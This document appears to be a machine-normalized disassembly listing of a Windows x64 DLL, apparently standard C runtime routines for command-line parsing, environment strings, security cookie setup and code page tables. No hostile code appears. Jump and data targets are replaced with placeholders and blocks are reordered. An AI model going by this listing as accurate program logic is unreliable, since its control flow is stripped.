test rax rax
je r-xdata
jmp r-xdata
or [ rdx - 0x9 ] 0xffffffffffffffff
and [ rdx + 0x2f ] 0x80
mov [ rdx - 0x1 ] 0xa00
mov [ rdx + 0x3 ] r14d
mov [ rdx + 0x30 ] 0xa0a
mov [ rdx + 0x47 ] r14d
mov [ rdx + 0x43 ] r14b
mov rax [ rdi ]
add rdx 0x58
lea rcx [ rdx - 0x9 ]
add rax 0xb00
cmp rcx rax
jb r-xdata
mov edx [ rw-data ]
lea rcx [ rbx + rdi + 0x10 ]
mov edx 0xfa0
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ rbx + rdi + 0x8 ] 0x8
test [ r13 ] 0x8
jne r-xdata
inc [ rbx + rdi + 0xc ]
jmp r-xdata
movsxd rbp edi
lea rcx [ rw-data ]
mov edx 0xfa0
mov rax rbp
and ebp 0x1f
sar rax 0x5
imul rbp rbp 0x58
add rbp [ rcx + rax * 8 ]
mov rax [ r12 ]
mov [ rbp ] rax
mov al [ r13 ]
lea rcx [ rbp + 0x10 ]
mov [ rbp + 0x8 ] al
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
mov rcx [ r12 ]
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc [ rbp + 0xc ]
sub_18000fb8c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
lea rbx [ rw-data ]
mov esi 0x40
add rbx 0x8
dec rsi
jne r-xdata
lea rax [ rdi + 0xb00 ]
jmp r-xdata
mov rdi [ rbx ]
test rdi rdi
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
cmp rdi rax
jb r-xdata
cmp [ rdi + 0xc ] 0x0
je r-xdata
mov rcx [ rbx ]
call sub_18000ec1c
and [ rbx ] 0x0
mov rax [ rbx ]
add rdi 0x58
add rax 0xb00
lea rcx [ rdi + 0x10 ]
call [ DeleteCriticalSection@IAT ]
sub_18000fc00
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x30
cmp [ rw-data ] 0x0
jne r-xdata
mov rbx [ rw-data ]
xor edi edi
test rbx rbx
jne r-xdata
call sub_180010ec4
mov al [ rbx ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
lea eax [ rdi + 0x1 ]
mov edx 0x8
movsxd rcx eax
call sub_18000f7ac
mov rdi rax
mov [ rw-data ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov rcx rbx
call sub_1800112a0
lea rbx [ rbx + rax + 0x1 ]
inc edi
mov rbx [ rw-data ]
cmp [ rbx ] 0x0
je r-xdata
mov rcx rbx
call sub_18000ec1c
and [ rw-data ] 0x0
and [ rdi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
mov rcx rbx
call sub_1800112a0
cmp [ rbx ] 0x3d
lea esi [ rax + 0x1 ]
je r-xdata
movsxd rax esi
add rbx rax
cmp [ rbx ] 0x0
jne r-xdata
movsxd rbp esi
mov edx 0x1
mov rcx rbp
call sub_18000f7ac
mov [ rdi ] rax
test rax rax
je r-xdata
mov rbx [ rw-data ]
mov rcx [ rw-data ]
call sub_18000ec1c
and [ rw-data ] 0x0
jmp r-xdata
mov r8 rbx
mov rdx rbp
mov rcx rax
call sub_180011824
test eax eax
jne r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_18000e930
int3
add rdi 0x8
sub_18000fd30
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x20
mov r13 [ rsp + 0x60 ]
mov r14 r9
mov rdi r8
and [ r13 ] 0x0
mov r12 rdx
mov rbx rcx
mov [ r9 ] 0x1
test rdx rdx
je r-xdata
xor ebp ebp
mov [ rdx ] r8
add r12 0x8
inc [ r13 ]
test rdi rdi
je r-xdata
xor eax eax
test ebp ebp
mov sil 0x22
sete al
inc rbx
mov ebp eax
jmp r-xdata
movzx esi [ rbx ]
inc rbx
mov ecx esi
call sub_180015354
test eax eax
je r-xdata
mov al [ rbx ]
mov [ rdi ] al
inc rdi
test ebp ebp
jne r-xdata
test sil sil
je r-xdata
inc [ r13 ]
test rdi rdi
je r-xdata
cmp [ rbx ] 0x22
jne r-xdata
cmp sil 0x20
je r-xdata
dec rbx
inc rbx
mov al [ rbx ]
mov [ rdi ] al
inc rdi
test rdi rdi
je r-xdata
cmp sil 0x9
jne r-xdata
test r12 r12
je r-xdata
cmp [ rbx ] 0x20
je r-xdata
xor esi esi
mov [ rdi - 0x1 ] 0x0
jmp r-xdata
inc [ r14 ]
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
and [ r12 ] 0x0
inc rbx
jmp r-xdata
cmp [ rbx ] 0x9
jne r-xdata
cmp [ rbx ] 0x0
je r-xdata
test r12 r12
je r-xdata
inc [ r14 ]
mov [ r12 ] rdi
add r12 0x8
cmp [ rbx ] 0x5c
je r-xdata
inc rbx
inc ecx
cmp [ rbx ] 0x22
jne r-xdata
test ecx ecx
jne r-xdata
test dl cl
jne r-xdata
dec ecx
test rdi rdi
je r-xdata
mov al [ rbx ]
test al al
je r-xdata
shr ecx 0x1
jmp r-xdata
test esi esi
je r-xdata
inc [ r13 ]
mov [ rdi ] 0x5c
inc rdi
test rdi rdi
je r-xdata
test esi esi
jne r-xdata
xor eax eax
xor edx edx
test esi esi
sete al
mov esi eax
lea rax [ rbx + 0x1 ]
cmp [ rax ] 0x22
jne r-xdata
inc [ r13 ]
jmp r-xdata
mov [ rdi ] 0x0
inc rdi
test edx edx
je r-xdata
cmp al 0x20
je r-xdata
mov rbx rax
jmp r-xdata
cmp [ rbx ] 0x0
je r-xdata
inc rbx
jmp r-xdata
movsx ecx al
call sub_180015354
test rdi rdi
je r-xdata
cmp al 0x9
je r-xdata
mov edx 0x1
xor ecx ecx
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
inc [ r13 ]
inc rbx
inc [ r13 ]
mov al [ rbx ]
mov [ rdi ] al
inc rdi
jmp r-xdata
mov al [ rbx ]
inc rbx
mov [ rdi ] al
inc rdi
inc [ r13 ]
sub_18000ff00
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x30
cmp [ rw-data ] 0x0
jne r-xdata
lea rdi [ rw-data ]
mov r8d 0x104
xor ecx ecx
mov rdx rdi
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
mov rbx [ rw-data ]
mov [ rw-data ] rdi
test rbx rbx
je r-xdata
call sub_180010ec4
mov rbx rdi
cmp [ rbx ] 0x0
jne r-xdata
or eax 0xffffffff
movsxd rcx [ rsp + 0x48 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
lea rax [ rsp + 0x48 ]
lea r9 [ rsp + 0x40 ]
xor r8d r8d
xor edx edx
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_18000fd30
movsxd rsi [ rsp + 0x40 ]
mov rcx 0x1fffffffffffffff
cmp rsi rcx
jae r-xdata
lea rdx [ rcx + rsi * 8 ]
cmp rdx rcx
jb r-xdata
mov rcx rdx
call sub_18000f72c
mov rdi rax
test rax rax
je r-xdata
lea r8 [ rax + rsi * 8 ]
lea rax [ rsp + 0x48 ]
lea r9 [ rsp + 0x40 ]
mov rdx rdi
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_18000fd30
mov r11d [ rsp + 0x40 ]
mov [ rw-data ] rdi
dec r11d
xor eax eax
mov [ rw-data ] r11d
jmp r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
sub_18000fff8
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x40
call [ GetEnvironmentStringsW@IAT ]
xor r12d r12d
mov rdi rax
test rax rax
je r-xdata
xor eax eax
mov rbx rax
cmp [ rax ] r12w
je r-xdata
mov [ rsp + 0x38 ] r12
sub rbx rax
mov [ rsp + 0x30 ] r12
sar rbx 0x1
mov r8 rax
xor edx edx
lea r9d [ rbx + 0x1 ]
xor ecx ecx
mov [ rsp + 0x28 ] r12d
mov [ rsp + 0x20 ] r12
call [ WideCharToMultiByte@IAT ]
movsxd rbp eax
test eax eax
je r-xdata
add rbx 0x2
cmp [ rbx ] r12w
jne r-xdata
mov rcx rdi
call [ FreeEnvironmentStringsW@IAT ]
mov rcx rbp
call sub_18000f72c
mov rsi rax
test rax rax
je r-xdata
add rbx 0x2
cmp [ rbx ] r12w
jne r-xdata
mov [ rsp + 0x38 ] r12
mov [ rsp + 0x30 ] r12
lea r9d [ rbx + 0x1 ]
mov r8 rdi
xor edx edx
xor ecx ecx
mov [ rsp + 0x28 ] ebp
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
test eax eax
jne r-xdata
mov rcx rdi
call [ FreeEnvironmentStringsW@IAT ]
mov rax rsi
jmp r-xdata
mov rcx rsi
call sub_18000ec1c
mov rsi r12
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
sub_1800100ec
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ r--data ]
lea rdi [ r--data ]
jmp r-xdata
cmp rbx rdi
jb r-xdata
mov rax [ rbx ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
add rbx 0x8
call rax
sub_180010124
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ r--data ]
lea rdi [ r--data ]
jmp r-xdata
cmp rbx rdi
jb r-xdata
mov rax [ rbx ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
add rbx 0x8
call rax
sub_18001015c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rsi rdx
mov edi ecx
call sub_18000f48c
xor r9d r9d
mov rbx rax
test rax rax
je r-xdata
xor eax eax
mov rdx [ rax + 0xa0 ]
mov rcx rdx
lea rax [ rdx + 0xc0 ]
cmp rcx rax
jae r-xdata
lea rax [ rdx + 0xc0 ]
add rcx 0x10
cmp rcx rax
jb r-xdata
mov rcx r9
cmp [ rcx ] edi
je r-xdata
cmp [ rcx ] edi
je r-xdata
mov r8 [ rcx + 0x8 ]
test r8 r8
je r-xdata
test rcx rcx
je r-xdata
cmp r8 0x5
jne r-xdata
cmp r8 0x1
jne r-xdata
mov [ rcx + 0x8 ] r9
lea eax [ r8 - 0x4 ]
jmp r-xdata
mov rbp [ rbx + 0xa8 ]
mov [ rbx + 0xa8 ] rsi
cmp [ rcx + 0x4 ] 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov [ rcx + 0x8 ] r9
mov ecx [ rcx + 0x4 ]
call r8
mov edx 0x30
mov rax [ rbx + 0xa0 ]
add rdx 0x10
mov [ rdx + rax - 0x8 ] r9
cmp rdx 0xc0
jl r-xdata
cmp [ rcx ] 0xc000008e
mov edi [ rbx + 0xb0 ]
jne r-xdata
cmp [ rcx ] 0xc0000090
jne r-xdata
mov [ rbx + 0xb0 ] 0x83
jmp r-xdata
cmp [ rcx ] 0xc0000091
jne r-xdata
mov [ rbx + 0xb0 ] 0x81
jmp r-xdata
mov edx [ rbx + 0xb0 ]
mov ecx 0x8
call r8
mov [ rbx + 0xb0 ] edi
jmp r-xdata
cmp [ rcx ] 0xc0000093
jne r-xdata
mov [ rbx + 0xb0 ] 0x84
jmp r-xdata
mov [ rbx + 0xa8 ] rbp
jmp r-xdata
cmp [ rcx ] 0xc000008d
jne r-xdata
mov [ rbx + 0xb0 ] 0x85
jmp r-xdata
cmp [ rcx ] 0xc000008f
jne r-xdata
mov [ rbx + 0xb0 ] 0x82
jmp r-xdata
cmp [ rcx ] 0xc0000092
jne r-xdata
mov [ rbx + 0xb0 ] 0x86
jmp r-xdata
cmp [ rcx ] 0xc00002b5
jne r-xdata
mov [ rbx + 0xb0 ] 0x8a
jmp r-xdata
cmp [ rcx ] 0xc00002b4
mov eax edi
mov edx 0x8e
cmove eax edx
mov [ rbx + 0xb0 ] eax
mov [ rbx + 0xb0 ] 0x8d
jmp r-xdata
sub_180010340
mov [ rsp + 0x18 ] rbx
push rdi
sub rsp 0x20
mov rax [ rw-data ]
and [ rsp + 0x30 ] 0x0
mov rdi 0x2b992ddfa232
cmp rax rdi
je r-xdata
lea rcx [ rsp + 0x30 ]
call [ GetSystemTimeAsFileTime@IAT ]
mov rbx [ rsp + 0x30 ]
call [ GetCurrentProcessId@IAT ]
mov r11d eax
xor rbx r11
call [ GetCurrentThreadId@IAT ]
mov r11d eax
xor rbx r11
call [ GetTickCount@IAT ]
lea rcx [ rsp + 0x38 ]
mov r11d eax
xor rbx r11
call [ QueryPerformanceCounter@IAT ]
mov r11 [ rsp + 0x38 ]
xor r11 rbx
mov rax 0xffffffffffff
and r11 rax
mov rax 0x2b992ddfa233
cmp r11 rdi
cmove r11 rax
mov [ rw-data ] r11
not r11
mov [ rw-data ] r11
not rax
mov [ rw-data ] rax
jmp r-xdata
mov rbx [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_1800103f4
push rbx
sub rsp 0x20
mov edx 0x8
lea ecx [ rdx + 0x18 ]
call sub_18000f7ac
mov rcx rax
mov rbx rax
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
mov [ rw-data ] rax
test rbx rbx
jne r-xdata
and [ rbx ] 0x0
xor eax eax
lea eax [ rbx + 0x18 ]
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_180010438
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r14
sub rsp 0x20
mov r14 rcx
call sub_18000ed64
nop
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov r12 rax
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov rbx rax
cmp rax r12
jb r-xdata
xor ebx ebx
mov rdi rax
sub rdi r12
lea r13 [ rdi + 0x8 ]
cmp r13 0x8
jb r-xdata
mov rcx r12
call sub_180015368
mov rsi rax
cmp rax r13
jae r-xdata
mov rcx r14
call [ EncodePointer@IAT ]
mov [ rbx ] rax
lea rcx [ rbx + 0x8 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
mov rbx r14
jmp r-xdata
mov edx 0x1000
cmp rax rdx
cmovb rdx rax
add rdx rax
cmp rdx rax
jb r-xdata
call sub_18000ed70
mov rax rbx
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
xor ebx ebx
mov rcx r12
call sub_18000f830
xor ebx ebx
test rax rax
jne r-xdata
mov rcx r12
call sub_18000f830
test rax rax
je r-xdata
sar rdi 0x3
lea rbx [ rax + rdi * 8 ]
mov rcx rax
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
jmp r-xdata
lea rdx [ rsi + 0x20 ]
cmp rdx rsi
jb r-xdata
sub_1800105e0
mov rax rcx
mov ecx 0x5a4d
cmp [ rax ] cx
je r-xdata
movsxd rcx [ rax + 0x3c ]
add rcx rax
xor eax eax
cmp [ rcx ] 0x4550
jne r-xdata
xor eax eax
retn
retn
mov edx 0x20b
cmp [ rcx + 0x18 ] dx
sete al
sub_180010610
movsxd r8 [ rcx + 0x3c ]
xor r9d r9d
mov r10 rdx
add r8 rcx
movzx eax [ r8 + 0x14 ]
movzx r11d [ r8 + 0x6 ]
lea rcx [ rax + r8 + 0x18 ]
test r11d r11d
je r-xdata
xor eax eax
retn
mov edx [ rcx + 0xc ]
cmp r10 rdx
jb r-xdata
inc r9d
add rcx 0x28
cmp r9d r11d
jb r-xdata
mov eax [ rcx + 0x8 ]
add eax edx
cmp r10 rax
jb r-xdata
mov rax rcx
retn
sub_180010660
sub rsp 0x28
mov r8 rcx
lea r9 [ __dos_header ]
mov rcx r9
call sub_1800105e0
test eax eax
je r-xdata
add rsp 0x28
retn
sub r8 r9
mov rdx r8
mov rcx r9
call sub_180010610
test rax rax
je r-xdata
mov eax [ rax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
jmp r-xdata
sub_1800106a4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
lea rbx [ rcx + 0x1c ]
mov rbp rcx
mov esi 0x101
mov rcx rbx
mov r8d esi
xor edx edx
call sub_18000bd10
xor r11d r11d
lea rdi [ rbp + 0x10 ]
lea ecx [ r11 + 0x6 ]
movzx eax r11w
mov [ rbp + 0xc ] r11d
mov [ rbp + 0x4 ] r11
[ rdi ]
lea rdi [ rw-data ]
sub rdi rbp
mov al [ rdi + rbx ]
mov [ rbx ] al
inc rbx
dec rsi
jne r-xdata
lea rcx [ rbp + 0x11d ]
mov edx 0x100
mov al [ rcx + rdi ]
mov [ rcx ] al
inc rcx
dec rdx
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_180010730
mov rax rsp
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push rbp
lea rbp [ rax - 0x488 ]
sub rsp 0x580
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x470 ] rax
mov rsi rcx
mov ecx [ rcx + 0x4 ]
lea rdx [ rsp + 0x50 ]
call [ GetCPInfo@IAT ]
mov ebx 0x100
test eax eax
je r-xdata
xor edx edx
lea rcx [ rsi + 0x1d ]
xor eax eax
lea rcx [ rsp + 0x70 ]
cmp r8d 0x19
ja r-xdata
or [ rcx ] 0x10
lea eax [ rdx + 0x20 ]
jmp r-xdata
mov [ rcx ] al
inc eax
inc rcx
cmp eax ebx
jb r-xdata
mov al [ rsp + 0x56 ]
mov [ rsp + 0x70 ] 0x20
lea rdi [ rsp + 0x56 ]
jmp r-xdata
mov [ rcx + 0x100 ] 0x0
or [ rcx ] 0x20
lea eax [ rdx - 0x20 ]
mov [ rcx + 0x100 ] al
jmp r-xdata
test al al
jne r-xdata
lea r8d [ rdx - 0x61 ]
lea eax [ r8 + 0x20 ]
cmp eax 0x19
ja r-xdata
mov rcx [ rbp + 0x470 ]
xor rcx rsp
call sub_18000c060
lea r11 [ rsp + 0x580 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
inc edx
inc rcx
cmp edx ebx
jb r-xdata
movzx edx [ rdi + 0x1 ]
movzx r8d al
cmp r8d edx
ja r-xdata
mov eax [ rsi + 0xc ]
and [ rsp + 0x38 ] 0x0
lea r8 [ rsp + 0x70 ]
mov [ rsp + 0x30 ] eax
mov eax [ rsi + 0x4 ]
mov r9d ebx
mov [ rsp + 0x28 ] eax
lea rax [ rbp + 0x270 ]
mov edx 0x1
xor ecx ecx
mov [ rsp + 0x20 ] rax
call sub_180015504
and [ rsp + 0x40 ] 0x0
mov eax [ rsi + 0x4 ]
mov edx [ rsi + 0xc ]
mov [ rsp + 0x38 ] eax
lea rax [ rbp + 0x70 ]
mov [ rsp + 0x30 ] ebx
mov [ rsp + 0x28 ] rax
lea r9 [ rsp + 0x70 ]
mov r8d ebx
xor ecx ecx
mov [ rsp + 0x20 ] ebx
call sub_180011614
and [ rsp + 0x40 ] 0x0
mov eax [ rsi + 0x4 ]
mov edx [ rsi + 0xc ]
mov [ rsp + 0x38 ] eax
lea rax [ rbp + 0x170 ]
mov [ rsp + 0x30 ] ebx
mov [ rsp + 0x28 ] rax
lea r9 [ rsp + 0x70 ]
mov r8d 0x200
xor ecx ecx
mov [ rsp + 0x20 ] ebx
call sub_180011614
lea rdx [ rbp + 0x70 ]
lea r8 [ rbp + 0x170 ]
sub rdx rsi
lea r11 [ rbp + 0x270 ]
lea rcx [ rsi + 0x1d ]
sub r8 rsi
add rdi 0x2
mov al [ rdi ]
sub edx r8d
mov eax r8d
lea rcx [ rsp + r8 + 0x70 ]
lea r8d [ rdx + 0x1 ]
mov dl 0x20
call sub_18000bd10
test [ r11 ] 0x2
je r-xdata
or [ rcx ] 0x10
mov al [ rdx + rcx - 0x1d ]
jmp r-xdata
mov [ rcx + 0x100 ] 0x0
or [ rcx ] 0x20
mov al [ r8 + rcx - 0x1d ]
mov [ rcx + 0x100 ] al
jmp r-xdata
test [ r11 ] 0x1
je r-xdata
jmp r-xdata
inc rcx
add r11 0x2
dec rbx
jne r-xdata
sub_180010920
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
call sub_18000f510
mov rdi rax
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
je r-xdata
mov ecx 0xd
call sub_180012fa4
nop
mov rbx [ rdi + 0xb8 ]
mov [ rsp + 0x30 ] rbx
cmp rbx [ rw-data ]
je r-xdata
cmp [ rax + 0xc0 ] 0x0
je r-xdata
mov ecx 0xd
call sub_180012ea4
test rbx rbx
je r-xdata
mov rbx [ rax + 0xb8 ]
jmp r-xdata
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
lea ecx [ rbx + 0x20 ]
call sub_18000f08c
mov rax [ rw-data ]
mov [ rdi + 0xb8 ] rax
mov rax [ rw-data ]
mov [ rsp + 0x30 ] rax
[ rax ]
mov rbx [ rsp + 0x30 ]
[ rbx ]
jne r-xdata
test rbx rbx
jne r-xdata
lea rax [ rw-data ]
mov rcx [ rsp + 0x30 ]
cmp rcx rax
je r-xdata
call sub_18000ec1c
sub_1800109dc
push rbx
sub rsp 0x40
mov ebx ecx
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_18000cd7c
and [ rw-data ] 0x0
cmp ebx 0xfffffffe
jne r-xdata
cmp ebx 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp ebx 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
add rsp 0x40
pop rbx
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
mov rax [ rsp + 0x20 ]
mov [ rw-data ] 0x1
mov eax [ rax + 0x4 ]
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
sub_180010a6c
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
sub rsp 0x40
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x38 ] rax
mov rsi rdx
call sub_1800109dc
xor ebx ebx
mov edi eax
test eax eax
jne r-xdata
lea r13 [ rw-data ]
mov ecx ebx
mov rbp rbx
mov rax r13
mov r12d 0x1
mov rcx rsi
call sub_1800106a4
jmp r-xdata
lea rcx [ rsi + 0x1c ]
xor edx edx
mov r8d 0x101
call sub_18000bd10
lea r10 [ rbp + rbp * 2 ]
lea r11 [ rw-data ]
shl r10 0x4
mov ebp 0x4
lea r8 [ r10 + r13 + 0x10 ]
add ecx r12d
add rbp r12
add rax 0x30
cmp ecx 0x5
jb r-xdata
xor eax eax
add r8 0x8
add r11 r12
sub rbp r12
jne r-xdata
cmp [ rcx + 0x1 ] bl
je r-xdata
cmp [ rax ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov rcx r8
cmp [ r8 ] bl
je r-xdata
mov [ rsi + 0x4 ] edi
sub edi 0x3a4
mov [ rsi + 0x8 ] r12d
je r-xdata
movzx edx [ rcx ]
movzx eax [ rcx + 0x1 ]
cmp edx eax
ja r-xdata
or eax 0xffffffff
jmp r-xdata
cmp edi 0xfde9
je r-xdata
mov ebx 0x411
sub edi 0x4
je r-xdata
add rcx 0x2
cmp [ rcx ] bl
jne r-xdata
lea r9 [ rdx + rsi + 0x1d ]
mov rcx [ rsp + 0x38 ]
xor rcx rsp
call sub_18000c060
mov rbx [ rsp + 0x80 ]
add rsp 0x40
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
movzx ecx di
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
movzx eax [ rdi + rcx ]
mov [ rcx ] ax
add rcx 0x2
sub rdx r12
jne r-xdata
mov rcx rsi
call sub_180010730
mov ebx 0x804
jmp r-xdata
sub edi 0xd
je r-xdata
mov al [ r11 ]
add edx r12d
or [ r9 ] al
movzx eax [ rcx + 0x1 ]
add r9 r12
cmp edx eax
jbe r-xdata
lea rdx [ rsp + 0x20 ]
mov ecx edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
sub r10 rsi
mov [ rsi + 0xc ] ebx
lea rcx [ rsi + 0x10 ]
lea rdi [ r10 + r13 - 0xc ]
mov edx 0x6
mov ebx 0x412
jmp r-xdata
dec edi
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
lea rcx [ rsi + 0x1c ]
xor edx edx
mov r8d 0x101
call sub_18000bd10
mov [ rsi + 0x4 ] edi
mov [ rsi + 0xc ] ebx
cmp [ rsp + 0x20 ] r12d
jbe r-xdata
mov ebx 0x404
jmp r-xdata
mov [ rsi + 0x8 ] ebx
lea rax [ rsp + 0x26 ]
cmp [ rsp + 0x26 ] bl
je r-xdata
lea rax [ rsi + 0x1e ]
mov ecx 0xfe
cmp [ rax + 0x1 ] bl
je r-xdata
or [ rax ] 0x8
add rax r12
sub rcx r12
jne r-xdata
mov ecx [ rsi + 0x4 ]
sub ecx 0x3a4
je r-xdata
movzx edi [ rax ]
movzx ecx [ rax + 0x1 ]
cmp edi ecx
ja r-xdata
mov eax 0x411
sub ecx 0x4
je r-xdata
add rax 0x2
cmp [ rax ] bl
jne r-xdata
sub ecx edi
lea rdx [ rdi + rsi + 0x1d ]
add ecx r12d
lea rdi [ rsi + 0x10 ]
movzx eax bx
mov ecx 0x6
[ rdi ]
jmp r-xdata
mov eax 0x804
jmp r-xdata
sub ecx 0xd
je r-xdata
or [ rdx ] 0x4
add rdx r12
sub rcx r12
jne r-xdata
mov [ rsi + 0xc ] eax
mov [ rsi + 0x8 ] r12d
jmp r-xdata
mov eax 0x412
jmp r-xdata
dec ecx
je r-xdata
mov eax 0x404
jmp r-xdata
mov eax ebx
jmp r-xdata
sub_180010ce4
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push r13
sub rsp 0x30
mov edi ecx
or r13d 0xffffffff
call sub_18000f510
mov rsi rax
call sub_180010920
mov rbx [ rsi + 0xb8 ]
mov ecx edi
call sub_1800109dc
mov r12d eax
cmp eax [ rbx + 0x4 ]
je r-xdata
xor edi edi
mov r13d edi
mov ecx 0x220
call sub_18000f72c
mov rbx rax
xor edi edi
test rax rax
je r-xdata
mov eax r13d
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
mov r12 [ rsp + 0x58 ]
add rsp 0x30
pop r13
retn
mov rdx [ rsi + 0xb8 ]
mov rcx rax
mov r8d 0x220
call sub_18000c440
mov [ rbx ] edi
mov rdx rbx
mov ecx r12d
call sub_180010a6c
mov r13d eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov rcx [ rsi + 0xb8 ]
lea r12 [ rw-data ]
[ rcx ]
jne r-xdata
lea r12 [ rw-data ]
cmp rbx r12
je r-xdata
mov [ rsi + 0xb8 ] rbx
[ rbx ]
test [ rsi + 0xc8 ] 0x2
jne r-xdata
mov rcx [ rsi + 0xb8 ]
cmp rcx r12
je r-xdata
call sub_18000ea3c
mov [ rax ] 0x16
jmp r-xdata
mov rcx rbx
call sub_18000ec1c
test [ rw-data ] 0x1
jne r-xdata
call sub_18000ec1c
mov esi 0xd
mov ecx esi
call sub_180012fa4
nop
mov eax [ rbx + 0x4 ]
mov [ rw-data ] eax
mov eax [ rbx + 0x8 ]
mov [ rw-data ] eax
mov eax [ rbx + 0xc ]
mov [ rw-data ] eax
mov edx edi
lea r8 [ __dos_header ]
mov edx edi
movsxd rcx edx
movzx eax [ rbx + rcx * 2 + 0x10 ]
mov [ r8 + rcx * 2 + 0x304b0 ] ax
inc edx
jmp r-xdata
mov [ rsp + 0x20 ] edi
cmp edi 0x100
jge r-xdata
movsxd rcx edx
mov al [ rcx + rbx + 0x1c ]
mov [ rcx + r8 + 0x2c140 ] al
inc edx
jmp r-xdata
mov [ rsp + 0x20 ] edx
cmp edx 0x5
jge r-xdata
mov rax [ rw-data ]
[ rax ]
jne r-xdata
movsxd rcx edi
mov al [ rcx + rbx + 0x11d ]
